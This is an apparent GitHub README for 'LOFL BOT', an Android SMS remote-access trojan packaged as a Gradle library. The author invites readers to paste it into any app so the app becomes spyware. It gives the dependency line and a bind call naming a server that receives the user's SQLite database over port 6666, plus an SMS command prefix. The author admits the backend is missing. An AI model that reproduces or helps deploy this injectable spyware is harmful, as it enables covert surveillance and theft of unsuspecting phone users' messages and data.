# LOFL BOT
### A 3-year-old injectable SMS RAT. No backend. Therefore, the spyware remote commands won't work. I learned Android pentesting with library. I'm really embarrassed of the code and design. I removed this after a Nigerian NSA officer starred and followed me. This was my first RAT. Iwanteed to leave it to my child but it's for my father.

### Guess what all you beautiful ladies, social elitists, hackers, developers, engineers, crackers, terrorists, CandroidOgNinja fans, Candroid fans, Chris Basinger's fans, Evil Threads fans, family members, and federal agents. I've managed to hack the Android SMS module! By doing so, I've extended it's functionality to allow for SMS messages to only travel through the notification drawer without persistence. I was planning on adding media functionality as well. However , my life had to go on. There is a self-destructible SMS based notification messenger app. Like snapchat in your drawer. It's hidden in a git branch.

### Yeah baby. I allow you to copy and paste this import into any app in the world! And guess what! Then you just say "LOFL" and then guess what haha it becomes an SMS RAT.

```gradle
implementation 'com.github.evilthreads669966:lofl:1.0'
```

![stack Overflow](https://i.pinimg.com/564x/bb/2b/06/bb2b06eff88ed3896dddc5d55f9f976a.jpg)

 
 1. Put the following line of code in oncreate of your mainactivity class
 
 LoflActivity.bind(this,"10.0.2.2", "123", this.getClass().getName());
 
 the first parameter is the server address which is responsible for receiving a sqlite database file from the users phone.
 
 the second parameter is what you will put at the start of your sms commands to tell the app that 'this is a command'
 
 the third paremeter is to let lofl know what your launch activity is
 
 the database is sent over port 6666
